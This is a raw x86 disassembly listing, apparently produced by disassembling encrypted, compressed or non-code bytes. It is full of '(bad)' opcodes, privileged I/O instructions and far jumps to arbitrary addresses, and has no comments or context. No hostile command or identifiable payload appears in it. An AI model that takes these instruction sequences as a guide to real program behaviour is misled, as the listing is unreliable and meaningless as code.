  4115cb:	sbb    edx,ecx
  4115cd:	pop    ss
  4115ce:	dec    esi
  4115cf:	and    BYTE PTR [ebp+0x1b389c28],bh
  4115d5:	(bad)  
  4115d6:	xchg   ebx,eax
  4115d7:	add    al,0xd6
  4115d9:	outs   dx,DWORD PTR ds:[esi]
  4115da:	call   0xacc2970e
  4115df:	push   cs
  4115e0:	adc    eax,0xedd24ddb
  4115e5:	mov    eax,ds:0x28198cb3
  4115ea:	jle    0x411652
  4115ec:	fist   WORD PTR [ebp+0x3e2f0419]
  4115f2:	imul   edi,DWORD PTR [ebp-0x2c],0xffffffd3
  4115f6:	stc    
  4115f7:	pop    es
  4115f8:	mov    al,0x54
  4115fa:	xor    DWORD PTR [edi-0x76441d8a],0xfdfa956b
  411604:	add    ah,ch
  411606:	cmc    
  411607:	sub    eax,0xf8d0493b
  41160c:	xchg   ebx,eax
  41160d:	lahf   
  41160e:	dec    ebp
  41160f:	sti    
  411610:	ficomp DWORD PTR [edi-0x1d]
  411613:	jecxz  0x41164e
  411615:	idiv   DWORD PTR [esi+0x7b]
  411618:	jae    0x4115b3
  41161a:	pop    eax
  41161b:	lahf   
  41161c:	pop    ebx
  41161d:	std    
  41161e:	xor    al,0xea
  411620:	shl    DWORD PTR [ecx],cl
  411622:	scas   al,BYTE PTR es:[edi]
  411623:	repnz std 
  411625:	nop
  411626:	out    0x2,eax
  411628:	adc    DWORD PTR [edx+0x0],0xa745d124
  41162f:	jp     0x4115fb
  411631:	xor    eax,0x9e7e99f3
  411636:	xor    ch,BYTE PTR [edx+0x5b]
  411639:	ficomp WORD PTR [eax]
  41163b:	fisubr DWORD PTR [esi-0x25]
  41163e:	jbe    0x411602
  411640:	sub    al,0x2b
  411642:	test   BYTE PTR [esi],ch
  411644:	hlt    
  411645:	test   al,0x90
  411647:	mov    cl,0x42
  411649:	or     ch,BYTE PTR [edi-0x5698917a]
  41164f:	push   eax
  411650:	gs lahf 
  411652:	pop    eax
  411653:	sahf   
  411654:	jp     0x41167f
  411656:	jno    0x4115eb
  411658:	pop    eax
  411659:	cmp    al,0x8f
  41165b:	pop    DWORD PTR [ebx]
  41165d:	outs   dx,BYTE PTR ds:[esi]
  41165e:	fbld   TBYTE PTR [ebp+0x4e]
  411661:	sub    bl,dl
  411663:	adc    eax,0xaa6731d8
  411668:	adc    DWORD PTR [eax+0x4a],edx
  41166b:	stc    
  41166c:	leave  
  41166d:	adc    BYTE PTR [ecx],dh
  41166f:	mov    ss,ebx
  411671:	jmp    0xe592:0xeb9df559
  411678:	dec    ebp
  411679:	xor    BYTE PTR [ebp+0x34b6cfb4],al
  41167f:	inc    ebx
  411680:	sub    al,0x3b
  411682:	mov    BYTE PTR [ecx],al
  411684:	lea    eax,[ebp-0x4]
  411687:	inc    BYTE PTR [eax]
  411689:	inc    eax
  41168a:	jmp    0x411b95
  41168f:	ret    
  411690:	cmp    eax,0xd5d2c0c8
  411695:	fcmovne st,st(1)
  411697:	out    dx,eax
  411698:	cld    
  411699:	mov    al,0x96
  41169b:	mov    ecx,DWORD PTR [ebp+0x36]
  41169e:	cmp    esp,esi
  4116a0:	jne    0x41171a
  4116a2:	js     0x41170e
  4116a4:	jl     0x41171e
  4116a6:	js     0x4116fc
  4116a8:	call   0x34c34e6b
  4116ad:	out    dx,al
  4116ae:	(bad)  
  4116b0:	imul   eax,esi,0xffffffb6
  4116b3:	inc    edx
  4116b4:	inc    edi
  4116b5:	jns    0x4116db
  4116b7:	test   eax,0x9ba44d72
  4116bc:	or     BYTE PTR [ebp+0x6b8522b],0x46
  4116c3:	jge    0x4116b5
  4116c5:	rcr    DWORD PTR [esi],0x9c
  4116c8:	adc    DWORD PTR [ebp+0x4ea6de33],0x6a
  4116cf:	in     eax,dx
  4116d0:	pop    eax
  4116d1:	push   cs
  4116d2:	mov    esi,0x55a49ed
  4116d7:	shl    dl,0x5d
  4116da:	(bad)  
  4116dc:	jecxz  0x411754
  4116de:	mov    eax,esi
  4116e0:	rol    BYTE PTR [esi+0x52],0x78
  4116e4:	mov    cl,0xa0
  4116e6:	or     eax,0xf08c05e
  4116eb:	push   es
  4116ec:	sub    DWORD PTR [edx+0x51],0x7df5dc07
  4116f3:	aad    0xd8
  4116f5:	fisubr WORD PTR [ebp+0x37]
  4116f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116f9:	inc    ecx
  4116fa:	push   ebx
  4116fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116fc:	inc    esi
  4116fd:	add    al,ah
  4116ff:	or     dh,BYTE PTR [ebx]
  411701:	jne    0x41171f
  411703:	sbb    DWORD PTR ds:0x892f9180,edx
  411709:	mov    edi,0xb3bb71e3
  41170e:	ins    DWORD PTR es:[edi],dx
  41170f:	dec    edx
  411710:	call   0x8c89548c
  411715:	jno    0x4116bd
  411717:	les    esi,FWORD PTR [eax-0x4b680b67]
  41171d:	inc    esi
  41171e:	pushf  
  41171f:	daa    
  411720:	ret    0x1273
  411723:	ret    
  411724:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411725:	mov    ebx,0xbc30437d
  41172a:	xor    eax,0xfa01c26d
  41172f:	ja     0x41179d
  411731:	enter  0xcd19,0x47
  411735:	sbb    DWORD PTR [eax],0xd
  411738:	jge    0x411749
  41173a:	sti    
  41173b:	pop    esp
  41173c:	mov    ds:0xa32372f,eax
  411741:	mov    eax,0xae529e8
  411746:	fwait
  411747:	jae    0x411705
  411749:	jbe    0x411726
  41174b:	jo     0x41178b
  41174d:	and    al,0x0
  41174f:	arpl   WORD PTR [edx-0x71],bx
  411752:	mov    bh,dl
  411754:	test   DWORD PTR [ecx],eax
  411756:	jmp    0x4116fe
  411758:	sbb    DWORD PTR [eax],esi
  41175a:	daa    
  41175b:	mul    DWORD PTR [ecx-0x62585914]
  411761:	into   
  411762:	mov    dl,0x76
  411764:	js     0x4116e6
  411766:	sbb    ecx,DWORD PTR [ebx+0x67]
  411769:	jbe    0x41174b
  41176b:	std    
  41176c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41176d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41176f:	mov    eax,0x790865ba
  411774:	mov    ah,0xb7
  411776:	push   ss
  411777:	in     al,dx
  411778:	test   edx,ecx
  41177a:	or     DWORD PTR [ecx-0x19],edi
  41177d:	test   eax,0x292033e4
  411782:	jge    0x411780
  411784:	shl    DWORD PTR [ebp+0x336fc69e],cl
  41178a:	jl     0x41172b
  41178c:	mov    BYTE PTR [edi+0x19],bl
  41178f:	clc    
  411790:	cmp    eax,0x95e44a95
  411795:	enter  0x9458,0x70
  411799:	push   ds
  41179a:	test   al,0xf7
  41179c:	lods   al,BYTE PTR ds:[esi]
  41179d:	sub    al,0x79
  41179f:	pop    ebx
  4117a0:	or     eax,0xc965c70b
  4117a5:	mov    DWORD PTR [edx+0xb],edx
  4117a8:	dec    edi
  4117a9:	xchg   ecx,eax
  4117aa:	stos   DWORD PTR es:[edi],eax
  4117ab:	sbb    BYTE PTR [edx],cl
  4117ad:	(bad)  
  4117af:	inc    eax
  4117b0:	ja     0x411742
  4117b2:	(bad)  
  4117b3:	ja     0x411808
  4117b5:	sbb    edi,edx
  4117b7:	addr16 dec ebx
  4117b9:	mov    al,ds:0xf30f23fc
  4117be:	jle    0x41174e
  4117c0:	mov    ds:0x82f2907f,eax
  4117c5:	in     al,dx
  4117c6:	xchg   ebx,eax
  4117c7:	test   eax,0xc679a40d
  4117cc:	adc    BYTE PTR [edx+edi*1-0x7ff9f01e],ch
  4117d3:	add    al,BYTE PTR [ebp-0x7d92b61f]
  4117d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117da:	mov    ds:0x626baf98,eax
  4117df:	push   ds
  4117e0:	mov    ?,WORD PTR [eax+0x7d]
  4117e3:	call   0xe4b4:0x98b8c032
  4117ea:	pop    eax
  4117eb:	push   cs
  4117ec:	in     eax,dx
  4117ed:	jno    0x411820
  4117ef:	cli    
  4117f0:	ret    0x4362
  4117f3:	and    edx,eax
  4117f5:	or     al,0x6e
  4117f7:	mov    al,0xae
  4117f9:	(bad)  
  4117fa:	or     DWORD PTR [ebp-0x25d40227],esp
  411800:	rcr    DWORD PTR [edx],cl
  411802:	push   es
  411803:	stos   DWORD PTR es:[edi],eax
  411804:	add    DWORD PTR [ecx-0xa],0x1d
  411808:	inc    edi
  411809:	adc    bh,dh
  41180b:	adc    BYTE PTR [esi],0x19
  41180e:	mov    ah,0x17
  411810:	test   BYTE PTR [edx+esi*2],dh
  411813:	mov    ecx,0x42584574
  411818:	mov    bh,0xcd
  41181a:	int3   
  41181b:	jae    0x411892
  41181d:	jecxz  0x4117f4
  41181f:	mov    dl,0xd5
  411821:	jle    0x411815
  411823:	popf   
  411824:	pop    edx
  411825:	dec    edi
  411826:	mov    edi,0xeae3d9c5
  41182b:	add    al,0x33
  41182d:	mov    eax,ds:0x9c8ee5af
  411832:	mov    cl,0x52
  411834:	sbb    al,0x32
  411836:	jb     0x411884
  411838:	xor    eax,0x8c825873
  41183d:	(bad)  [eax]
  41183f:	clc    
  411840:	popa   
  411841:	pop    esp
  411842:	adc    ebp,eax
  411844:	in     al,0x43
  411846:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411847:	sbb    al,0x59
  411849:	aam    0x83
  41184b:	daa    
  41184c:	jo     0x4118a9
  41184e:	out    dx,al
  41184f:	xchg   DWORD PTR ds:0x3136f939,edi
  411855:	jg     0x411869
  411857:	call   0x65f4:0x756ceb7b
  41185e:	es adc dl,ah
  411861:	push   edi
  411862:	test   al,0x7c
  411864:	in     al,0xe0
  411866:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411867:	push   cs
  411868:	jno    0x41188e
  41186a:	cmp    dh,0xc6
  41186d:	xlat   BYTE PTR ds:[ebx]
  41186e:	cmp    al,0x16
  411870:	das    
  411871:	or     ebp,esi
  411873:	ins    DWORD PTR es:[edi],dx
  411874:	and    eax,0xf21bb815
  411879:	ficomp DWORD PTR [esp+edi*8-0x42]
  41187d:	dec    edx
  41187e:	(bad)  
  41187f:	enter  0x343b,0x6a
  411883:	mov    DWORD PTR [eax-0x69],ecx
  411886:	pop    ebp
  411887:	outs   dx,DWORD PTR ds:[esi]
  411888:	cmp    al,0xe7
  41188a:	test   al,0x43
  41188c:	daa    
  41188d:	out    dx,al
  41188e:	sbb    ebx,DWORD PTR ds:0xc92695d0
  411894:	jns    0x41187a
  411896:	xor    eax,0xf22dfc01
  41189b:	pop    edx
  41189c:	mov    WORD PTR [ebx+ebp*8-0x54be805c],ss
  4118a3:	jmp    0x34f41026
  4118a8:	inc    eax
  4118a9:	pop    esi
  4118aa:	xchg   edx,eax
  4118ab:	int3   
  4118ac:	stos   BYTE PTR es:[edi],al
  4118ad:	xchg   ebp,esp
  4118af:	push   edi
  4118b0:	daa    
  4118b1:	sbb    dh,BYTE PTR [bx+si-0x22]
  4118b5:	xor    ebp,esi
  4118b7:	jmp    0xea54:0x572910a8
  4118be:	mov    ch,0xa5
  4118c0:	jne    0x411930
  4118c2:	fdivr  QWORD PTR [esi*2+0x395890e]
  4118c9:	xor    al,0x8
  4118cb:	bnd jle 0x411875
  4118ce:	and    eax,0xb6caba3e
  4118d3:	fsub   st(7),st
  4118d5:	sbb    al,0xa2
  4118d7:	jo     0x4118bb
  4118d9:	into   
  4118da:	mov    edi,0x63c040eb
  4118df:	cmp    eax,0x54faed4d
  4118e4:	je     0x4118a6
  4118e6:	jg     0x4118bf
  4118e8:	dec    edi
  4118e9:	add    dl,BYTE PTR [esi]
  4118eb:	cli    
  4118ec:	push   0xffffffb1
  4118ee:	add    BYTE PTR [ecx+0x3e],bh
  4118f1:	sub    dh,bh
  4118f3:	pop    edx
  4118f4:	dec    ebx
  4118f5:	loop   0x41195d
  4118f7:	fisttp QWORD PTR [ebp+0x7c82d02d]
  4118fd:	pushf  
  4118fe:	ror    BYTE PTR [esi-0x47b9af22],1
  411904:	xchg   ebx,eax
  411905:	pop    es
  411906:	and    al,0x9c
  411908:	fwait
  411909:	pop    eax
  41190a:	add    edx,DWORD PTR [edx+0x4d6b3c2b]
  411910:	(bad)  
  411911:	into   
  411912:	enter  0x4602,0xfb
  411916:	stc    
  411917:	push   ss
  411918:	ds loope 0x4118ad
  41191b:	enter  0x3435,0x39
  41191f:	pop    ds
  411920:	pop    ecx
  411921:	xchg   ebx,eax
  411922:	sahf   
  411923:	add    bl,bl
  411925:	push   ebp
  411926:	call   0xe47d:0xb615477d
  41192d:	in     eax,dx
  41192e:	jae    0x4118d3
  411930:	xor    BYTE PTR [eax+0x3bddc00e],bl
  411936:	sub    dh,BYTE PTR [ecx]
  411938:	loop   0x4118dc
  41193a:	xchg   ebx,eax
  41193b:	cld    
  41193c:	push   ecx
  41193d:	lea    edx,[edx+0x41]
  411940:	scas   al,BYTE PTR es:[edi]
  411941:	fwait
  411942:	add    eax,0x950a8d9b
  411947:	mov    ebx,0xee8dbcd1
  41194c:	fs jo  0x4118d8
  41194f:	test   BYTE PTR [ebx-0x3c],cl
  411952:	or     eax,0xe318a81c
  411957:	xchg   edi,eax
  411958:	jmp    0x4118de
  41195a:	mov    ecx,ebp
  41195c:	sbb    al,ch
  41195e:	repnz (bad)
  411961:	inc    ecx
  411962:	or     dl,BYTE PTR [ecx]
  411964:	ds clc 
  411966:	xchg   ecx,eax
  411967:	(bad)  
  411969:	cwde   
  41196a:	fwait
  41196b:	adc    dl,BYTE PTR [esp+ecx*2+0x73f3a80a]
  411972:	inc    edi
  411973:	or     eax,0xbf611253
  411978:	js     0x411936
  41197a:	outs   dx,BYTE PTR ds:[esi]
  41197b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41197c:	cdq    
  41197d:	jnp    0x411967
  41197f:	test   DWORD PTR [ebx],0x258151a4
  411985:	(bad)
  411988:	xchg   DWORD PTR [ebx-0x611c489f],eax
  41198e:	mov    edi,0x5d9a8b45
  411993:	push   0xb6254b4b
  411998:	add    eax,0x78e06268
  41199d:	lods   eax,DWORD PTR ds:[esi]
  41199e:	sbb    esp,0xe4a6bb85
  4119a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119a5:	dec    ebx
  4119a6:	pop    ebp
  4119a7:	fwait
  4119a8:	out    0xc3,eax
  4119aa:	xchg   edx,ecx
  4119ac:	ja     0x41199e
  4119ae:	nop
  4119af:	mov    ah,0xe
  4119b1:	add    al,0x4e
  4119b3:	jmp    0x27995f80
  4119b8:	loop   0x4119ef
  4119ba:	sbb    al,0xba
  4119bc:	in     al,0x89
  4119be:	lds    ebp,FWORD PTR [eax]
  4119c0:	or     cl,0xe7
  4119c3:	xlat   BYTE PTR ds:[ebx]
  4119c4:	add    DWORD PTR [ebx],0xadc39912
  4119ca:	aam    0x5e
  4119cc:	push   cs
  4119cd:	cmp    DWORD PTR [ebx+0x7b],0xcf5ba84c
  4119d4:	(bad)  
  4119d5:	in     al,0x42
  4119d7:	cwde   
  4119d8:	in     eax,0xdc
  4119da:	fs or  edi,ebx
  4119dd:	mov    ch,0xce
  4119df:	dec    ebp
  4119e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119e1:	pop    ebp
  4119e2:	jae    0x4119c2
  4119e4:	dec    esi
  4119e5:	gs (bad) 
  4119e7:	in     al,0xf0
  4119e9:	or     al,0xa1
  4119eb:	mov    eax,ds:0x5a8275e0
  4119f0:	xor    ch,cl
  4119f2:	and    bl,BYTE PTR [esi+esi*4+0x2d]
  4119f6:	pop    ss
  4119f7:	pop    esi
  4119f8:	and    al,0xd1
  4119fa:	call   0xf127:0x4bfac714
  411a01:	cmp    esi,edx
  411a03:	es push ss
  411a05:	mov    bh,0xd9
  411a07:	(bad)  
  411a08:	pop    ds
  411a09:	sti    
  411a0a:	mov    bl,0x6b
  411a0c:	or     dh,bl
  411a0e:	add    ebp,esi
  411a10:	push   0x5a
  411a12:	add    al,0xae
  411a14:	push   ebx
  411a15:	mov    ebp,0x8a11d6b
  411a1a:	xor    al,0x80
  411a1c:	nop
  411a1d:	dec    edi
  411a1e:	bound  ebx,QWORD PTR [eax+0x7c]
  411a21:	pop    esi
  411a22:	lock fs das 
  411a25:	shl    DWORD PTR [eax+0x662b129c],0xad
  411a2c:	cmp    esp,eax
  411a2e:	add    eax,0xa4f8eef8
  411a33:	push   ds
  411a34:	loope  0x4119e5
  411a36:	jmp    0x24dc:0xef89bf41
  411a3d:	data16 cs or al,0xd6
  411a41:	les    ebp,FWORD PTR [edx]
  411a43:	xchg   esp,eax
  411a44:	and    edi,DWORD PTR [esi-0x25]
  411a47:	lahf   
  411a48:	(bad)  
  411a49:	jmp    0x411a75
  411a4b:	pop    ebx
  411a4c:	xor    al,BYTE PTR [edi-0xa72747]
  411a52:	out    dx,eax
  411a53:	clc    
  411a54:	and    eax,DWORD PTR [ecx]
  411a56:	inc    esp
  411a57:	fldcw  WORD PTR [ebx-0x609ff3f2]
  411a5d:	and    esi,ebx
  411a5f:	lods   al,BYTE PTR ds:[esi]
  411a60:	repz mov dl,0x72
  411a63:	jo     0x411aa6
  411a65:	aas    
  411a66:	lahf   
  411a67:	adc    DWORD PTR [edi+0x1d],esi
  411a6a:	jae    0x411a59
  411a6c:	rcl    DWORD PTR [ebx+ebx*1-0x3c],cl
  411a70:	sar    DWORD PTR [edx-0x2aee7dd7],cl
  411a76:	test   DWORD PTR [esi],ebp
  411a78:	mov    ecx,0xacea6b45
  411a7d:	fcmovnu st,st(1)
  411a7f:	js     0x411a4d
  411a81:	repnz mov edi,0x786dc41
  411a87:	pusha  
  411a88:	in     al,dx
  411a89:	pop    ds
  411a8a:	push   esi
  411a8b:	cmp    al,0x8
  411a8d:	sbb    eax,0xfd17a4a8
  411a92:	xchg   ah,cl
  411a94:	inc    edi
  411a95:	sbb    ebp,DWORD PTR [edx+0x5b6474e5]
  411a9b:	gs push ecx
  411a9d:	popa   
  411a9e:	gs je  0x411a37
  411aa1:	mov    ds:0x9f884229,eax
  411aa6:	in     al,dx
  411aa7:	in     eax,0x47
  411aa9:	in     eax,0x35
  411aab:	nop
  411aac:	ret    0x3538
  411aaf:	sbb    dh,BYTE PTR [edx]
  411ab1:	out    0x5f,al
  411ab3:	nop
  411ab4:	lock add BYTE PTR [ecx+0x20],0xdc
  411ab9:	add    DWORD PTR [esi+0x2aa4456d],edx
  411abf:	ror    BYTE PTR [edx],0x1e
  411ac2:	mov    ah,ch
  411ac4:	outs   dx,DWORD PTR ds:[esi]
  411ac5:	xchg   edi,eax
  411ac6:	mov    ah,0x64
  411ac8:	inc    edi
  411ac9:	push   ecx
  411aca:	and    dl,BYTE PTR [ebx-0x50]
  411acd:	push   ebx
  411ace:	fdivr  DWORD PTR [esi-0x6a]
  411ad1:	in     eax,0x2b
  411ad3:	fcmovnbe st,st(0)
  411ad5:	fisttp DWORD PTR [ecx]
  411ad7:	cmp    DWORD PTR [eax-0x6b],esp
  411ada:	cmovle ebx,DWORD PTR [eax+0x690f631c]
  411ae1:	ins    DWORD PTR es:[edi],dx
  411ae2:	call   0xccac26d9
  411ae7:	retf   0xeaf0
  411aea:	mov    ebp,0x3ba8b2f4
  411aef:	sbb    BYTE PTR [esi+0x1be82dcd],cl
  411af5:	jecxz  0x411a82
  411af7:	shr    edi,1
  411af9:	cmp    ch,BYTE PTR [ebx]
  411afb:	adc    al,BYTE PTR [eax+0x30]
  411afe:	mov    ds:0x16301720,eax
  411b03:	sub    eax,0xaf3e42e7
  411b08:	or     DWORD PTR [ebp+eax*2-0xa],eax
  411b0c:	adc    DWORD PTR [ebx+0x7b],edx
  411b0f:	cmp    BYTE PTR [ebp+ecx*4+0x0],dl
  411b13:	das    
  411b14:	ret    
  411b15:	int    0xad
  411b17:	or     ebx,DWORD PTR [ebp+ecx*8+0x269deaeb]
  411b1e:	and    al,0x4e
  411b20:	cmp    DWORD PTR [eax],ebx
  411b22:	aam    0x1b
  411b24:	jns    0x411aff
  411b26:	push   edx
  411b27:	dec    eax
  411b28:	add    BYTE PTR [ebp-0x7e],dh
  411b2b:	scas   eax,DWORD PTR es:[edi]
  411b2c:	xchg   edx,eax
  411b2d:	enter  0x45cb,0xa3
  411b31:	mov    al,0xa
  411b33:	retf   0x11e0
  411b36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b37:	jle    0x411ace
  411b39:	rol    BYTE PTR [esi+eiz*2+0x9f57001],cl
  411b40:	jle    0x411b17
  411b42:	out    dx,eax
  411b43:	mov    edx,0x2e9cef35
  411b48:	cmp    BYTE PTR [esi-0x4fa05055],ch
  411b4e:	sub    eax,0x503cbec6
  411b53:	cmp    dh,BYTE PTR [ebp+0x5756e9c0]
  411b59:	sub    BYTE PTR [edx-0x68],bh
  411b5c:	mov    WORD PTR [ebp+0x78cd007c],gs
  411b62:	call   0xcac:0x6fa786a
  411b69:	loopne 0x411b3b
  411b6b:	pop    esi
  411b6c:	push   edi
  411b6d:	out    dx,eax
  411b6e:	das    
  411b6f:	or     al,0x43
  411b71:	sbb    eax,0x70c729bf
  411b76:	loopne 0x411bd3
  411b78:	jmp    0x411bc6
  411b7a:	jae    0x411b05
  411b7c:	mov    esi,0xcd068300
  411b81:	int3   
  411b82:	mov    al,BYTE PTR [eax]
  411b84:	inc    ebp
  411b85:	jb     0x411ba5
  411b87:	repnz add al,0x78
  411b8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b8b:	pushf  
  411b8c:	outs   dx,BYTE PTR ds:[esi]
  411b8d:	aam    0xc9
  411b8f:	jbe    0x411b25
  411b91:	push   eax
  411b92:	and    edx,eax
  411b94:	pusha  
  411b95:	push   eax
  411b96:	pop    ecx
  411b97:	dec    ecx
  411b98:	jmp    0x4120a3
  411b9d:	rcl    bh,0xcd
  411ba0:	(bad)  
  411ba1:	int    0xc6
  411ba3:	xlat   BYTE PTR ds:[ebx]
  411ba4:	aad    0xef
  411ba6:	sahf   
  411ba7:	mov    esi,0xe8164566
  411bac:	loop   0x411b7e
  411bae:	js     0x411c2f
  411bb0:	js     0x411c1c
  411bb2:	jl     0x411c2c
  411bb4:	js     0x411be7
  411bb6:	mov    bl,0x3
  411bb8:	cli    
  411bb9:	pop    esi
  411bba:	xchg   ebx,eax
  411bbb:	adc    bh,BYTE PTR [edi]
  411bbd:	adc    al,0x7f
  411bbf:	mov    al,0x74
  411bc1:	push   ebx
  411bc2:	addr16 out dx,eax
  411bc4:	jg     0x411b69
  411bc6:	shl    DWORD PTR [edi+0x63c47a0b],0x84
  411bcd:	loop   0x411bdd
  411bcf:	stos   DWORD PTR es:[edi],eax
  411bd0:	inc    eax
  411bd1:	push   0xc858436d
  411bd6:	jo     0x411bad
  411bd8:	in     eax,dx
  411bd9:	scas   eax,DWORD PTR es:[edi]
  411bda:	(bad)  
  411bdb:	fst    DWORD PTR [edx+0x7]
  411bde:	scas   al,BYTE PTR es:[edi]
  411bdf:	test   al,0x5c
  411be1:	dec    edx
  411be2:	repz push ecx
  411be4:	shl    bh,1
  411be6:	aaa    
  411be7:	mov    esp,0xee81bf57
  411bec:	ds inc ebx
  411bee:	fldenv [ebx]
  411bf0:	sahf   
  411bf1:	sbb    eax,0xa82898ae
  411bf6:	aas    
  411bf7:	mov    ds:0x270cb273,eax
  411bfc:	shl    BYTE PTR [eax+0x4ee16191],1
  411c02:	rol    esp,cl
  411c04:	sbb    WORD PTR [eax-0x17],di
  411c08:	div    ebp
  411c0a:	adc    BYTE PTR [eax],bh
  411c0c:	jmp    0x411c12
  411c0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c0f:	pop    esp
  411c10:	lahf   
  411c11:	mov    DWORD PTR [ebx+0x42365cf1],esi
  411c17:	daa    
  411c18:	dec    edx
  411c19:	popa   
  411c1a:	mov    bh,0xfb
  411c1c:	jmp    0x565627b7
  411c21:	fidivr DWORD PTR [esp+eiz*8]
  411c24:	out    0xea,eax
  411c26:	in     eax,0x58
  411c28:	clc    
  411c29:	fcom   QWORD PTR [ebx-0x67]
  411c2c:	imul   ebp,DWORD PTR [ebx-0xd],0xa493a8c0
  411c33:	icebp  
  411c34:	xor    al,0x44
  411c36:	jmp    0x411c33
  411c38:	or     ebx,DWORD PTR [ecx+0x2a0e2f62]
  411c3e:	mov    esi,0xf43d95a4
  411c43:	push   ss
  411c44:	or     bl,BYTE PTR [esi-0x13]
  411c47:	mov    BYTE PTR [ecx-0x37ce1085],ah
  411c4d:	cld    
  411c4e:	xlat   BYTE PTR ds:[ebx]
  411c4f:	cmp    eax,0xd0d8b0ce
  411c54:	sbb    eax,0x7ad57d19
  411c59:	fcmovu st,st(4)
  411c5b:	inc    ecx
  411c5c:	shl    edx,cl
  411c5e:	cwde   
  411c5f:	adc    al,0x1f
  411c61:	sbb    dl,al
  411c63:	add    DWORD PTR [esp+ecx*2],0x5e3348f2
  411c6a:	adc    eax,0x3986f576
  411c6f:	push   0x27c5773a
  411c74:	arpl   cx,bx
  411c76:	ss mov eax,0x5da55284
  411c7c:	ds jbe 0x411cfc
  411c7f:	sbb    edx,esi
  411c81:	(bad)  
  411c82:	jae    0x411cbb
  411c84:	jne    0x411cf9
  411c86:	repz shl BYTE PTR [edx+0x8a6cb01],cl
  411c8d:	retf   
  411c8e:	xchg   edi,eax
  411c8f:	add    esp,DWORD PTR [ecx]
  411c91:	push   edi
  411c92:	outs   dx,DWORD PTR ds:[esi]
  411c93:	outs   dx,DWORD PTR ds:[esi]
  411c94:	out    0xa9,al
  411c96:	out    dx,al
  411c97:	add    edx,esp
  411c99:	push   ecx
  411c9a:	inc    eax
  411c9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c9c:	loop   0x411cd0
  411c9e:	stos   BYTE PTR es:[edi],al
  411c9f:	xor    BYTE PTR [ecx+0x2d5f37d8],bh
  411ca5:	out    0x73,al
  411ca7:	mov    es,WORD PTR [esi+ebp*1]
  411caa:	mov    cl,0xfd
  411cac:	ss dec esp
  411cae:	(bad)  
  411cb0:	push   eax
  411cb1:	sbb    eax,0x34617eb7
  411cb6:	or     DWORD PTR [edi+ecx*2-0xb],0xd0297a25
  411cbe:	in     al,dx
  411cbf:	fs jle 0x411c81
  411cc2:	js     0x411d36
  411cc4:	aam    0xfa
  411cc6:	into   
  411cc7:	inc    eax
  411cc8:	cmp    eax,0x5f33364d
  411ccd:	aad    0xf7
  411ccf:	jmp    0x76865775
  411cd4:	mov    al,0xec
  411cd6:	xor    DWORD PTR [esi+0x65],ecx
  411cd9:	jno    0x411cd1
  411cdb:	out    dx,eax
  411cdc:	pop    edi
  411cdd:	jl     0x411ce6
  411cdf:	and    ah,cl
  411ce1:	(bad)  
  411ce2:	jmp    DWORD PTR [ebx+edx*8-0x24]
  411ce6:	out    dx,eax
  411ce7:	daa    
  411ce8:	sbb    ecx,DWORD PTR [eax+edx*2]
  411ceb:	mov    ebp,0x449c39dd
  411cf0:	inc    BYTE PTR [edx-0x17]
  411cf3:	into   
  411cf4:	dec    esp
  411cf5:	inc    esp
  411cf6:	ss (bad) 
  411cf8:	jns    0x411ce1
  411cfa:	test   DWORD PTR [ebx+0x72],esi
  411cfd:	mov    dh,0x76
  411cff:	loopne 0x411cf3
  411d01:	sub    ch,dh
  411d03:	pcmpeqd mm1,mm2
  411d06:	push   DWORD PTR [ecx+0x44]
  411d09:	cmp    DWORD PTR [eax],ebp
  411d0b:	enter  0x14ef,0x2
  411d0f:	cmp    al,BYTE PTR [ebx-0x5b]
  411d12:	mov    ecx,0x20eb5f39
  411d17:	dec    ebp
  411d18:	xchg   edx,eax
  411d19:	inc    ebp
  411d1a:	imul   DWORD PTR [edi-0x74706b9a]
  411d20:	xchg   ebx,eax
  411d21:	xor    ah,BYTE PTR [ecx-0x2a]
  411d24:	retf   0x629a
  411d27:	js     0x411cab
  411d29:	jmp    0x411d61
  411d2b:	or     dh,BYTE PTR ds:0x88e05f22
  411d31:	arpl   WORD PTR [esi+eax*2],cx
  411d34:	sbb    al,0x1b
  411d36:	shl    DWORD PTR [eax+0x2299ae01],cl
  411d3c:	adc    ch,al
  411d3e:	aas    
  411d3f:	out    0x79,al
  411d41:	mov    DWORD PTR [edx+0x16c08e0c],edi
  411d47:	adc    DWORD PTR [ecx+eax*1+0x7c],eax
  411d4b:	sub    BYTE PTR gs:[ebx+0x46d20893],0x44
  411d53:	shl    dl,cl
  411d55:	pmulhw mm3,mm7
  411d58:	pop    ecx
  411d59:	or     ecx,ebx
  411d5b:	adc    eax,DWORD PTR [ebx-0x59]
  411d5e:	lahf   
  411d5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d60:	stos   BYTE PTR es:[edi],al
  411d61:	pop    eax
  411d62:	pop    esi
  411d63:	es pop esi
  411d65:	jg     0x411d66
  411d67:	xchg   edx,eax
  411d68:	and    al,0xc
  411d6a:	mov    ebp,0xf5fe865d
  411d6f:	clc    
  411d70:	int3   
  411d71:	jno    0x411de5
  411d73:	dec    ebx
  411d74:	push   ebx
  411d75:	lds    ebp,FWORD PTR [edx]
  411d77:	retf   
  411d78:	push   edx
  411d79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d7a:	cdq    
  411d7b:	dec    ecx
  411d7c:	das    
  411d7d:	test   BYTE PTR [eax+0x258c9af7],0x9a
  411d84:	xchg   edx,eax
  411d85:	sbb    edi,edx
  411d87:	add    ebp,DWORD PTR [esi-0xd3267c3]
  411d8d:	call   0x37ddbb52
  411d92:	mov    bh,0x38
  411d94:	mov    esp,0x7ef84b44
  411d99:	push   ebp
  411d9a:	pop    esp
